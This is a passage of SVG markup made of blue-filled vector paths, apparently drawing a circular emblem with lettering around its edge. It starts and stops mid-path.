	C466.316040,233.002213 465.166321,235.549042 465.981110,236.967209 
	C466.689575,238.200333 470.274109,239.163879 471.403320,238.428360 
	C472.871368,237.472153 474.018402,234.616394 473.797333,232.757339 
	C473.286896,228.465271 469.810883,230.192596 466.612518,230.945602 
M142.989349,231.527573 
	C140.370300,229.557312 137.468781,228.412262 135.691147,232.067581 
	C134.974136,233.541946 135.623962,236.262527 136.627167,237.764374 
	C137.189682,238.606461 139.853210,238.533600 141.382416,238.141312 
	C144.725693,237.283691 144.279510,234.673126 142.989349,231.527573 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M392.983154,435.004211 
	C373.146332,449.024536 351.535583,457.737274 327.823364,460.949280 
	C319.337494,462.098755 310.718323,463.015991 302.178253,462.881134 
	C268.784698,462.353912 238.440704,452.268951 211.714966,432.117615 
	C185.651154,412.465424 168.076950,386.755493 157.815002,355.789368 
	C151.407303,336.453735 149.552582,316.557678 151.221771,296.591797 
	C153.871918,264.892334 165.134979,236.344437 185.734070,211.653061 
	C199.258453,195.441895 215.131226,182.217575 233.884354,172.692169 
	C250.535141,164.234604 268.148621,158.844818 286.916687,156.865387 
	C325.235382,152.823990 360.299072,161.422714 391.990021,183.085373 
	C416.250244,199.668671 434.007996,221.777481 445.506897,248.921509 
	C451.843536,263.879608 455.557892,279.324738 457.145294,295.530243 
	C460.059723,325.283112 454.663727,353.406464 440.836914,379.606140 
	C434.833344,390.981995 427.021606,401.651947 418.635559,411.447784 
	C411.205597,420.126709 401.841888,427.150177 392.983154,435.004211 
M206.463043,421.983429 
	C218.320297,432.938721 231.964951,441.044006 246.752075,447.359314 
	C262.781647,454.205170 279.549988,457.993134 296.890289,458.931366 
	C313.311401,459.819916 329.402496,457.565918 345.280548,453.126770 
	C370.806976,445.990112 392.689606,432.642395 411.204681,414.049103 
	C423.203033,402.000061 432.786987,387.953461 439.924957,372.354706 
	C453.500671,342.687500 457.453400,311.884399 450.972168,279.864166 
	C444.747681,249.112335 430.116333,222.822906 407.488953,201.251144 
	C399.928040,194.042953 391.223511,187.874222 382.455170,182.125031 
	C362.263947,168.886215 339.717957,161.895859 315.778748,160.175095 
	C301.953949,159.181381 288.094879,159.967041 274.311401,162.840576 
	C247.705597,168.387283 224.486954,180.366714 204.343689,198.295776 
	C192.828659,208.545044 183.299652,220.511368 175.408554,233.902863 
	C156.399628,266.161621 150.858505,300.770966 157.316010,337.248566 
	C161.287170,359.681183 170.273087,380.378418 184.346497,398.411346 
	C190.803040,406.684387 198.699036,413.834076 206.463043,421.983429 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M301.665527,134.996201 
	C306.022095,135.134109 307.192230,133.149628 307.063446,129.433105 
	C306.834351,122.820808 306.999115,116.194870 306.999115,109.301025 
	C309.094482,109.301025 310.682404,109.301025 312.553070,109.301025 
	C312.920258,112.202751 313.288177,115.110092 313.656097,118.017426 
	C314.303497,117.972786 314.950897,117.928146 315.598297,117.883507 
	C315.812164,115.212494 316.026031,112.541489 316.287964,109.270142 
	C317.924408,109.197517 319.630737,109.121796 321.678131,109.030937 
	C321.678131,123.446144 321.678131,137.488907 321.678131,151.755081 
	C319.808197,151.755081 318.216858,151.755081 315.548767,151.755081 
	C315.548767,142.084610 315.548767,132.585938 315.548767,123.087265 
	C314.699188,123.071312 313.849579,123.055351 313.000000,123.039391 
	C313.000000,127.625854 313.000000,132.212326 313.000000,136.798782 
	C313.000000,141.604279 313.000000,146.409790 313.000000,151.595062 
	C310.964905,151.595062 309.273499,151.595062 307.166809,151.595062 
	C307.166809,147.726990 307.166809,143.950287 307.166809,139.995880 
	C301.232269,139.995880 295.694946,139.993576 290.157654,139.996628 
	C285.991333,139.998932 283.760101,138.412521 283.930206,133.753662 
	C284.196686,126.455414 284.000916,119.140282 284.000916,111.417892 
	C290.668365,111.417892 297.036163,111.417892 303.722961,111.417892 
	C303.793884,112.740936 303.861664,114.005241 303.964569,115.924988 
	C299.342743,115.924988 294.951324,115.924988 290.287903,115.924988 
	C290.287903,122.472839 290.287903,128.379532 290.287903,134.998489 
	C294.007996,134.998489 297.607269,134.998489 301.665527,134.996201 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M430.316864,413.316162 
	C431.735931,411.317261 433.154968,409.318329 434.606262,407.273987 
	C442.590973,409.356628 450.560760,411.435364 458.530548,413.514069 
	C453.399170,407.387573 451.768616,398.718567 443.905701,394.975586 
	C447.636871,387.657959 451.613220,379.859436 455.677612,371.888245 
	C457.586182,372.855255 459.180237,373.662903 460.299316,374.229919 
	C458.845367,377.123383 456.969543,379.776184 456.379639,382.689362 
	C456.203003,383.561737 459.617279,385.161255 461.803925,386.726501 
	C463.271271,384.205536 464.392365,382.279480 465.714905,380.007294 
	C467.231171,380.746490 468.796692,381.509705 469.940735,382.067444 
	C468.651947,384.265656 467.444977,386.324371 465.933533,388.902405 
	C469.273621,390.076721 474.147278,392.751343 474.893616,391.882141 
	C477.753937,388.550842 479.288940,384.081573 481.239868,380.193726 
	C485.825562,383.338776 485.873047,383.439636 482.863983,389.398254 
	C480.741760,393.600677 478.550171,397.768097 476.951111,400.864014 
	C467.727966,396.282288 458.919006,391.906281 450.110016,387.530304 
	C449.592316,388.004425 449.074585,388.478577 448.556885,388.952728 
	C454.967560,398.537384 461.378204,408.122070 467.969055,417.976105 
	C464.983795,420.940979 461.427582,420.303772 457.983765,419.470520 
	C450.989380,417.778229 444.058685,415.822021 437.060242,414.148132 
	C435.383331,413.747009 433.543762,414.026031 431.238007,413.844543 
	C430.570282,413.569946 430.443573,413.443054 430.316864,413.316162 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M462.056030,265.740784 
	C461.960358,264.078491 461.898560,262.785980 461.797791,260.677826 
	C467.541687,262.907440 472.937805,265.025452 478.351593,267.097290 
	C484.393738,269.409576 489.499451,266.989227 494.667847,263.597382 
	C495.177124,266.605072 495.652313,269.411560 496.223206,272.783173 
	C483.721863,270.497955 477.293457,278.663452 471.358459,285.336731 
	C471.764465,289.278015 472.083771,292.377777 472.498047,296.399261 
	C481.247559,295.617615 489.908447,294.843903 499.241791,294.010132 
	C499.453369,295.723114 499.841461,298.865417 500.200897,301.775513 
	C490.569977,301.775513 481.487030,301.775513 471.493286,301.775513 
	C472.390106,305.329773 473.048157,307.937683 473.850830,311.118835 
	C472.016785,311.037720 470.211182,310.957886 468.555359,310.884674 
	C467.683289,301.831207 466.253510,293.141052 466.332489,284.464630 
	C466.360077,281.435394 469.985443,278.344788 472.214905,275.474121 
	C473.163635,274.252472 474.746857,273.523590 477.211884,271.709717 
	C471.794495,270.656036 468.537903,265.871460 463.439606,269.404877 
	C462.960754,268.236084 462.525330,267.173340 462.056030,265.740784 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M239.936386,473.220398 
	C247.750229,460.689423 264.622986,464.518341 269.811371,471.609070 
	C274.782318,478.402588 273.981323,489.191498 268.303955,494.161102 
	C261.553131,500.070374 251.024780,500.256989 244.317749,494.857880 
	C238.025574,489.792694 235.784134,481.354279 239.936386,473.220398 
M244.093735,484.043213 
	C244.362656,484.640472 244.684937,485.219879 244.892197,485.837799 
	C246.865997,491.722595 252.094681,495.043793 257.686218,493.943054 
	C262.428528,493.009491 267.488037,485.816864 266.973572,480.740082 
	C266.308350,474.175659 261.980255,470.034485 255.749512,470.000763 
	C248.216095,469.959991 244.347961,474.323517 244.093735,484.043213 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M429.688995,443.322083 
	C425.237732,438.501068 422.632141,431.794281 415.230408,429.079895 
	C417.455048,427.298553 419.670074,425.524933 421.026520,424.438782 
	C428.142273,433.293243 434.853699,441.644531 441.575134,450.008331 
	C438.666260,451.990387 438.653778,452.064178 426.166473,449.952698 
	C421.042847,449.086304 415.986023,447.824646 410.898804,446.742798 
	C410.589661,447.177460 410.280487,447.612122 409.971344,448.046783 
	C414.564636,453.115662 419.157928,458.184540 424.031372,463.562561 
	C422.621887,464.726044 420.515076,466.465088 418.145905,468.420746 
	C417.257843,462.470459 403.148132,445.758270 397.954468,444.271271 
	C400.191528,440.588287 402.356567,438.389648 407.392517,439.862701 
	C414.121094,441.830841 421.174866,442.687103 428.633423,444.296692 
	C429.596252,444.617126 430.014709,444.661743 430.433136,444.706360 
	C430.185089,444.244934 429.937042,443.783508 429.688995,443.322083 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M167.916992,425.826111 
	C168.270340,422.888763 168.574097,420.375610 169.060532,416.351044 
	C162.969238,422.087769 157.906891,426.855469 152.440323,432.003845 
	C151.439240,431.010559 149.627213,429.212677 147.892319,427.491302 
	C157.349243,421.356903 165.269318,414.394226 172.142761,405.886017 
	C179.193100,409.139343 175.054443,415.427460 174.546600,420.674103 
	C174.017715,426.138062 172.660995,431.521912 171.666214,436.940765 
	C172.064178,437.140503 172.462143,437.340210 172.860123,437.539917 
	C177.688614,432.959137 182.517105,428.378326 187.646790,423.511810 
	C188.632492,424.667267 190.597000,426.970062 192.282181,428.945465 
	C182.047638,432.851776 175.990692,442.835144 166.124527,449.338104 
	C163.270065,441.090820 166.790924,433.725342 167.916992,425.826111 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M136.157974,404.368286 
	C134.904373,404.138397 133.143494,403.606140 133.175598,403.224854 
	C133.378159,400.819214 133.539948,398.244843 134.528503,396.101257 
	C137.693542,389.238129 141.213470,382.538635 143.995605,374.898987 
	C137.688583,378.232513 131.381561,381.566040 124.661224,385.118042 
	C123.789337,383.407654 122.550415,380.977264 121.627762,379.167297 
	C131.933197,375.933289 141.816132,372.320801 150.305420,365.079193 
	C152.674103,367.969238 153.821655,371.351440 151.143906,375.942902 
	C147.560318,382.087616 144.777771,388.699493 141.651260,395.110779 
	C142.081635,395.500397 142.512009,395.890015 142.942368,396.279663 
	C148.806595,393.008423 154.670822,389.737183 161.001160,386.205933 
	C161.671448,387.508453 162.958572,390.009644 163.768936,391.584381 
	C158.093445,394.100647 152.822922,396.381287 147.602234,398.770874 
	C143.860153,400.483673 140.184799,402.342224 136.157974,404.368286 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M299.528839,475.152039 
	C298.874329,474.179596 298.481934,473.524078 297.856110,472.478668 
	C301.234253,472.762054 304.107849,473.003113 305.852570,473.149445 
	C304.746582,483.959900 303.643799,494.738770 302.455719,506.351379 
	C292.328064,500.353149 289.354950,488.891785 280.907532,480.147217 
	C280.907532,488.343475 280.907532,495.313995 280.907532,502.541260 
	C279.031769,502.541260 276.408905,502.541260 273.719513,502.541260 
	C277.411865,492.087036 277.368195,481.856598 276.515991,471.247406 
	C280.544922,469.811310 283.521484,471.482819 286.111969,475.907013 
	C289.647552,481.945282 294.008820,487.500061 298.016083,493.262115 
	C298.534180,493.244141 299.052277,493.226166 299.570374,493.208191 
	C299.643890,487.295135 299.717438,481.382080 299.528839,475.152039 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M147.767151,192.267517 
	C145.818527,190.670822 144.122192,189.330154 142.372131,187.947021 
	C143.865295,185.796814 144.773880,184.488403 145.913773,182.846893 
	C147.732681,184.018112 149.496506,185.153854 150.516724,185.810776 
	C153.020279,183.700867 155.619934,181.747360 157.929855,179.496521 
	C160.242950,177.242569 162.266693,174.691681 164.459000,172.223999 
	C162.739990,170.323105 161.522827,168.977158 159.982101,167.273392 
	C161.455307,165.889206 162.888840,164.542313 164.338409,163.180328 
	C168.453506,166.837997 172.457092,170.277328 176.318192,173.869812 
	C178.946335,176.315125 178.850449,179.273254 176.631287,181.803391 
	C172.268356,186.777695 167.714340,191.590317 163.113724,196.348328 
	C159.437531,200.150299 157.121872,200.088730 153.009491,196.544189 
	C151.392349,195.150360 149.685471,193.860641 147.767151,192.267517 
M165.993576,185.507751 
	C167.394547,184.097046 168.864380,182.747345 170.180420,181.261429 
	C172.176453,179.007721 171.781067,177.243423 168.397049,175.892426 
	C164.093903,180.648895 159.703644,185.501663 155.226379,190.450592 
	C157.205521,192.930344 158.862122,194.629395 161.154755,190.752625 
	C162.222076,188.947815 164.021912,187.576233 165.993576,185.507751 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M396.662964,450.220490 
	C401.180573,458.163818 405.479279,465.799805 410.063629,473.943207 
	C406.621460,476.210266 401.682800,478.204987 397.348480,481.353760 
	C392.076599,485.183624 385.067139,483.953888 381.453125,477.059052 
	C378.233643,470.916870 374.484253,465.052399 370.766785,458.721466 
	C372.709045,457.581421 375.177246,456.132629 377.344910,454.860229 
	C378.463013,457.808197 379.207184,460.359985 380.372437,462.702271 
	C382.053619,466.081635 384.036102,469.311401 385.897827,472.600586 
	C388.724731,477.594879 392.492340,479.139832 396.306213,476.877380 
	C400.681671,474.281738 401.139374,470.581055 398.011047,465.469513 
	C395.784241,461.830963 393.984985,457.929535 391.734131,454.307434 
	C390.700470,452.643982 389.040863,451.369415 387.251251,449.482086 
	C389.771912,448.200592 392.591644,446.767059 395.574036,445.250824 
	C395.909546,447.048706 396.176819,448.480927 396.662964,450.220490 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M469.109131,370.940552 
	C465.095764,369.804352 461.477997,368.728027 456.852997,367.352020 
	C458.622986,363.028503 460.150360,357.486053 463.032135,352.771454 
	C465.874603,348.121185 472.660034,349.345001 475.765167,354.576538 
	C476.579315,355.948242 476.899048,357.613342 477.747009,359.986603 
	C483.665283,357.290771 489.644226,354.567291 495.739777,351.790680 
	C495.631104,356.590942 493.489288,360.095306 488.559021,361.731750 
	C484.396576,363.113312 480.242767,364.520752 475.982147,366.976105 
	C480.459381,368.181549 484.936615,369.386963 489.831299,370.704803 
	C489.157684,372.808594 488.293488,375.507721 487.613586,377.631104 
	C481.431396,375.367462 475.468079,373.183929 469.109131,370.940552 
M463.912689,360.347015 
	C464.054047,361.211029 463.956024,362.673767 464.375732,362.841614 
	C467.029755,363.902832 469.798462,364.677338 472.446533,365.520111 
	C475.445282,361.638733 473.190338,359.012085 470.595276,357.008789 
	C467.406830,354.547363 465.644440,357.158630 463.912689,360.347015 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M113.651047,289.210815 
	C120.562782,289.055481 127.097649,289.088074 133.629684,288.967865 
	C135.985672,288.924530 138.334900,288.514313 140.837006,288.256042 
	C140.837006,290.622009 140.837006,293.256927 140.837006,295.566498 
	C133.816696,295.047791 126.873901,294.123108 119.940918,294.191528 
	C116.327370,294.227203 113.015762,296.137665 112.958862,300.910889 
	C112.902420,305.646332 115.014610,307.523285 119.698006,308.185455 
	C126.746941,309.181976 133.640762,309.881592 140.730225,307.316193 
	C140.730225,310.468964 140.730225,313.537323 140.730225,316.238434 
	C129.931168,314.659790 119.414368,312.265289 109.292809,315.221130 
	C108.892822,310.771851 108.311287,305.935455 108.063622,301.082031 
	C107.823311,296.372559 109.523743,292.359955 113.651047,289.210815 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M388.995789,162.027740 
	C387.489929,165.534790 386.085022,168.670929 384.611145,171.960968 
	C382.842804,171.397141 381.330475,170.914932 379.127808,170.212601 
	C380.143768,167.658325 380.872650,165.225067 382.046326,163.029587 
	C383.458191,160.388687 383.067871,158.795303 380.225616,157.607147 
	C374.774506,155.328400 369.339996,152.990463 364.031250,150.404800 
	C362.789276,149.799866 362.076813,148.107773 361.120728,146.915863 
	C362.766113,146.589020 364.671753,145.558716 366.012634,146.054855 
	C372.458771,148.439911 378.752411,151.237137 385.693970,154.135986 
	C389.285370,146.094040 392.857605,138.095001 396.659943,129.580688 
	C398.621735,130.535538 400.300842,131.352798 402.199585,132.276962 
	C400.837738,135.193512 399.665070,137.704895 398.357300,140.505646 
	C400.191772,141.411530 401.993286,142.301132 404.079224,143.331192 
	C403.416077,144.817154 402.842834,146.101562 402.074310,147.823593 
	C397.113190,144.236786 395.251770,146.858521 393.791443,151.346344 
	C392.630310,154.914566 390.690674,158.229462 388.995789,162.027740 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M204.163162,438.790771 
	C202.135269,447.620636 199.839661,456.142609 197.698013,464.703064 
	C197.044937,467.313507 196.815552,470.029999 196.309601,473.217926 
	C193.598648,471.143616 191.054108,469.196625 189.609558,468.091309 
	C190.938766,464.061157 193.446686,460.416931 192.704681,457.641510 
	C191.892426,454.603271 188.078110,452.367554 185.116074,449.311584 
	C181.782867,451.914276 178.816422,454.230621 175.397720,456.900085 
	C173.995270,455.859680 171.544510,454.041595 168.871292,452.058502 
	C180.300217,448.358215 189.513992,441.727478 199.744629,435.220917 
	C200.359146,435.699219 202.156891,437.098419 204.163162,438.790771 
M195.755753,443.720581 
	C193.810318,444.693481 191.864899,445.666351 189.163116,447.017487 
	C191.744034,448.706543 193.522278,449.870300 195.555710,451.201050 
	C196.141846,448.468750 196.613770,446.268921 197.572800,443.821594 
	C197.617188,443.403076 197.661560,442.984528 197.705948,442.566010 
	C197.244644,442.814331 196.783356,443.062653 195.755753,443.720581 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M427.195984,185.267578 
	C429.660278,182.534729 431.865295,180.046951 434.732788,176.811722 
	C436.279968,179.219894 437.318756,180.836777 438.546936,182.748428 
	C435.089172,185.908188 431.100708,189.552917 426.750122,193.528549 
	C427.806000,194.609726 428.594818,195.417465 429.557556,196.403259 
	C432.948456,193.565536 436.040283,191.147278 438.936066,188.513474 
	C442.890015,184.917236 443.323212,184.946732 445.821838,189.957962 
	C442.379425,193.669983 438.924866,197.395081 435.259033,201.348022 
	C437.787964,204.376190 440.619202,207.766327 443.711121,211.468628 
	C442.715820,212.559662 441.676331,213.699173 440.636841,214.838684 
	C441.157318,214.173233 441.677795,213.507767 442.198273,212.842316 
	C432.927307,204.524643 423.625580,196.240799 414.403320,187.869446 
	C411.492279,185.227036 413.613190,183.616577 416.144653,181.870499 
	C418.301208,183.894424 420.447174,185.908401 422.727814,188.048767 
	C424.168518,187.180649 425.552582,186.346664 427.195984,185.267578 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M127.067993,357.810577 
	C125.443649,350.971832 120.857880,349.173584 113.612617,352.654694 
	C112.959061,349.952240 112.337379,347.381622 111.665413,344.603088 
	C123.115051,347.592590 134.023849,348.417786 145.689316,348.506348 
	C148.564774,354.275085 148.554047,354.261383 142.604630,358.924042 
	C135.380356,364.585815 128.176559,370.273651 120.623955,376.217773 
	C119.843231,373.593231 118.951157,370.594299 118.030396,367.498993 
	C125.024925,367.285706 128.660370,363.416473 127.067993,357.810577 
M138.346893,355.096649 
	C138.618484,354.537872 138.890091,353.979095 139.161667,353.420288 
	C136.575836,352.936310 133.990021,352.452301 130.731827,351.842468 
	C131.511963,354.786774 132.055923,356.839752 132.650574,359.084045 
	C134.653702,357.738983 136.254349,356.664154 138.346893,355.096649 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M335.308655,492.708008 
	C337.122437,495.774231 338.729797,498.528748 340.495575,501.554749 
	C339.252777,501.795380 337.744904,502.120758 336.224823,502.372437 
	C334.649719,502.633209 333.062775,502.822601 332.669678,501.930389 
	C330.918976,498.697021 329.909271,494.125122 327.199158,492.624725 
	C324.725433,491.255219 319.407440,492.080872 317.198883,494.035767 
	C315.156219,495.843811 315.573883,500.431396 314.761658,504.534058 
	C313.486053,504.534058 310.783142,504.534058 308.511505,504.534058 
	C311.497742,494.182800 314.570160,483.532776 317.897369,471.999542 
	C321.597076,470.734222 324.995361,472.520905 327.302948,477.559845 
	C329.625824,482.632141 332.480499,487.460876 335.308655,492.708008 
M323.130005,482.510864 
	C322.552246,481.500549 321.974487,480.490234 321.086761,478.937866 
	C320.282471,480.923553 319.622131,482.197906 319.258667,483.551971 
	C318.900604,484.885956 318.843323,486.300659 318.653717,487.682739 
	C325.240082,488.244019 325.522003,487.972961 323.130005,482.510864 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M365.925385,120.568024 
	C369.387115,122.019714 372.537262,123.295403 375.848724,124.636414 
	C376.618469,123.521324 377.349915,122.461731 378.256317,121.148651 
	C379.733704,121.552338 381.229767,121.961121 382.977692,122.438728 
	C382.656372,124.059601 382.380829,125.449646 382.035797,127.190163 
	C383.108612,127.688820 384.227905,128.213852 385.351288,128.729843 
	C386.396729,129.210022 387.612610,129.485062 388.455841,130.200943 
	C389.737549,131.289062 390.762207,132.679993 391.896027,133.942307 
	C390.264893,134.693375 388.633759,135.444427 386.284943,136.525955 
	C386.115326,140.491776 384.003082,144.597946 378.611328,145.892181 
	C373.359711,147.152786 367.111298,144.707138 365.020752,141.015152 
	C362.090485,135.840271 362.483459,132.767639 367.038269,126.880203 
	C365.780792,126.227234 364.579254,125.603302 362.664764,124.609154 
	C363.739075,123.072914 364.676453,121.732460 365.925385,120.568024 
M377.340179,131.110321 
	C374.197479,129.373032 371.264252,129.883743 370.150330,133.248306 
	C369.551788,135.056137 370.212921,138.106781 371.494629,139.512802 
	C373.300781,141.494156 376.052979,141.835510 378.355530,139.204559 
	C380.798279,136.413406 380.735168,133.973404 377.340179,131.110321 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M471.162415,326.996338 
	C472.185608,327.076263 472.832855,327.147888 472.982239,327.164398 
	C471.982758,330.595062 470.728149,333.899109 470.190247,337.316010 
	C470.012817,338.442932 471.686707,339.861298 472.982574,341.874176 
	C476.252563,338.028107 479.247803,334.977173 481.667908,331.523254 
	C483.990753,328.208130 486.828247,326.443176 490.762268,327.116638 
	C495.148987,327.867584 496.910767,331.549377 497.792389,335.213806 
	C498.470428,338.031860 498.076385,341.173737 497.807343,344.139709 
	C497.284729,349.901428 493.049866,350.587036 488.253052,350.812683 
	C489.989746,347.851074 491.607147,345.149597 493.168060,342.415894 
	C494.922943,339.342468 494.252472,336.156464 491.536926,334.653564 
	C490.321381,333.980774 487.199646,335.800690 485.513947,337.184784 
	C483.666870,338.701355 482.304840,340.915497 481.040161,343.011841 
	C478.546051,347.146149 474.722076,347.621552 470.667084,346.725037 
	C466.720551,345.852600 465.136719,342.501190 465.135712,338.906342 
	C465.134766,335.536591 465.857300,332.085999 466.841766,328.847382 
	C467.125427,327.914124 469.416016,327.590942 471.162415,326.996338 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M120.506012,335.714417 
	C122.355591,332.118347 123.956566,328.729462 125.332054,325.251343 
	C127.046043,320.917267 129.605759,317.698639 134.730606,318.113647 
	C138.397491,318.410614 142.606689,323.621826 142.946869,328.102173 
	C143.147049,330.738556 142.983429,333.402588 142.983429,336.430054 
	C141.195404,337.005157 139.470352,337.559998 138.083435,338.006073 
	C138.083435,334.483459 138.372650,331.371124 137.942596,328.361542 
	C137.768005,327.139771 135.842484,325.118317 135.040100,325.263611 
	C133.555206,325.532471 131.836380,326.863556 131.070862,328.231232 
	C129.730743,330.625549 128.883774,333.337128 128.108826,335.996948 
	C126.935493,340.024200 124.281548,343.354736 120.337517,342.664581 
	C117.112602,342.100311 113.520805,339.445892 111.622749,336.670868 
	C109.749161,333.931549 109.489479,329.913666 109.079788,326.391785 
	C108.559311,321.917755 111.631081,320.639526 115.077446,320.176300 
	C115.077446,324.806976 114.773399,329.212616 115.308716,333.513794 
	C115.430122,334.489227 118.464050,335.102203 120.506012,335.714417 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M137.085495,279.337891 
	C138.433792,277.150787 139.489410,275.234314 140.994690,272.501465 
	C131.109711,270.848114 122.339767,269.381256 113.111191,267.837677 
	C113.352707,266.288452 113.799652,263.421509 114.166481,261.068451 
	C124.577232,263.206848 134.904755,265.328156 145.801895,267.566467 
	C145.002579,271.258575 144.245377,276.043762 142.885834,280.651245 
	C141.678024,284.744537 136.999878,287.533936 133.405762,286.946869 
	C128.849686,286.202667 126.029205,282.600983 126.001945,277.479858 
	C125.991951,275.601074 126.000343,273.722260 126.639267,271.662262 
	C129.035736,275.970123 129.918854,281.589203 137.085495,279.337891 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M453.993378,197.002014 
	C450.886993,199.148178 448.294159,201.524155 445.276611,203.072540 
	C444.170654,203.640030 442.058441,202.246552 440.405273,201.747635 
	C441.115723,200.542358 441.576599,199.048996 442.578918,198.180664 
	C447.415222,193.991058 452.397339,189.969772 457.661133,185.612793 
	C451.489227,178.826797 445.846802,172.622971 439.907806,166.093063 
	C440.762665,165.078094 441.654633,164.019058 443.093231,162.310989 
	C450.605560,170.281189 457.823151,177.938660 465.582886,186.171341 
	C461.708557,189.869385 458.023590,193.386688 453.993378,197.002014 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M187.491074,202.228821 
	C185.223312,206.661285 182.498688,206.375595 179.558609,203.055756 
	C177.706100,200.963974 175.830261,198.892868 173.697678,196.514511 
	C169.249710,201.381851 165.363815,205.634109 161.297318,210.084015 
	C158.888123,208.560989 156.429230,207.315857 159.364014,204.133316 
	C167.196747,195.639343 175.077515,187.188797 182.828613,178.620956 
	C185.146729,176.058563 186.977646,175.827393 189.145264,179.173187 
	C185.233490,183.615784 181.333588,188.044907 178.740311,190.990097 
	C181.636169,194.685547 184.476746,198.310440 187.491074,202.228821 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M214.690369,455.653442 
	C216.739716,452.957367 215.193848,451.832275 213.179382,451.092468 
	C211.355270,450.422546 209.437897,450.006531 207.570923,449.481201 
	C209.242416,444.796509 210.610489,444.063232 214.734818,446.383789 
	C220.550217,449.655853 226.227097,453.174042 232.366562,456.826996 
	C230.866684,458.436249 229.673431,459.716461 228.495758,460.980011 
	C226.294205,459.221283 224.309540,457.635803 221.610107,455.479309 
	C217.100830,463.538513 212.759384,471.297760 208.075623,479.668823 
	C206.557861,478.849976 203.948181,477.442047 201.860275,476.315582 
	C206.179932,469.351135 210.332443,462.656189 214.690369,455.653442 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M359.451355,491.800232 
	C361.087738,490.444122 362.385986,489.246185 363.988281,487.767731 
	C363.988281,490.625549 363.988281,492.892303 363.988281,495.569000 
	C357.520966,497.341797 351.123322,499.095490 345.930542,500.518921 
	C343.162628,490.225128 340.460602,480.176300 337.634430,469.665863 
	C339.135864,469.230804 341.897644,468.430542 344.069977,467.801086 
	C346.134766,476.022217 347.947205,483.739899 350.136230,491.349213 
	C350.425140,492.353485 352.623169,493.344788 353.960144,493.376801 
	C355.665558,493.417633 357.394440,492.476410 359.451355,491.800232 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M220.693832,147.664215 
	C218.884171,150.607315 217.673859,153.672852 215.479736,155.642456 
	C214.316574,156.686615 211.444778,155.827377 209.049713,155.132080 
	C217.226196,148.136627 217.211960,140.388184 212.436859,131.845840 
	C212.739151,131.417969 213.041443,130.990097 213.343735,130.562210 
	C215.176468,130.892990 217.832901,130.563019 218.711945,131.658829 
	C225.905594,140.626343 225.804947,140.707092 236.633270,142.549133 
	C237.442154,145.387894 236.595016,147.176529 233.410812,146.946472 
	C230.009399,146.700729 226.639694,146.010620 223.238113,145.777115 
	C222.492584,145.725952 221.670898,146.783951 220.693832,147.664215 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M241.946854,145.142517 
	C238.516083,137.502777 235.140442,130.243561 231.592392,122.613564 
	C233.271149,121.589722 234.612198,120.771851 236.430908,119.662659 
	C238.097244,122.502083 239.630081,125.114037 241.253113,127.879669 
	C243.200439,127.382408 245.026199,126.916199 246.872787,126.444664 
	C250.602768,131.055481 246.119293,131.674667 243.445770,133.519104 
	C245.649780,138.591309 247.889511,143.745758 250.098877,148.830307 
	C244.962936,152.305771 244.881241,152.269470 241.946854,145.142517 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M222.948730,163.150238 
	C221.952042,160.866089 221.009293,158.959457 219.912216,156.740662 
	C221.721207,155.778412 223.393295,154.888977 225.308960,153.869965 
	C226.977875,157.512787 228.529999,160.900696 230.262070,164.681396 
	C237.697800,161.425552 244.963013,158.244370 252.629944,154.887299 
	C253.451126,156.310181 254.236343,157.670746 255.169998,159.288467 
	C247.884521,162.593842 240.984055,165.983124 233.880157,168.872162 
	C227.263809,171.562927 226.102905,170.800018 222.948730,163.150238 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M430.887024,413.887238 
	C431.679993,415.180573 432.039734,416.557373 432.924469,417.342834 
	C439.667328,423.329285 446.512726,429.200226 453.822693,435.537567 
	C452.109467,436.955627 449.917450,438.769989 448.596649,439.863220 
	C440.943054,433.135254 433.233154,426.357819 424.955658,419.081421 
	C425.943115,417.999481 427.882935,415.874054 430.069794,413.532410 
	C430.443573,413.443054 430.570282,413.569946 430.887024,413.887238 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M229.708435,484.680725 
	C229.510590,486.532318 229.510590,488.059998 229.510590,489.984741 
	C226.667847,488.762299 224.023987,487.625397 221.833954,486.683624 
	C226.129639,477.123962 230.443069,467.524811 234.964188,457.463470 
	C236.499283,458.123291 239.220032,459.292755 240.993820,460.055176 
	C237.159592,468.459045 233.532928,476.407898 229.708435,484.680725 
z"/>
<path fill="#005AA9" opacity="1.000000" stroke="none" 
	d="
M475.097046,320.001526 
	C472.338501,320.450867 470.020386,320.900970 467.553589,321.379913 
	C467.760162,318.835266 467.992828,315.969055 468.157471,313.940582 
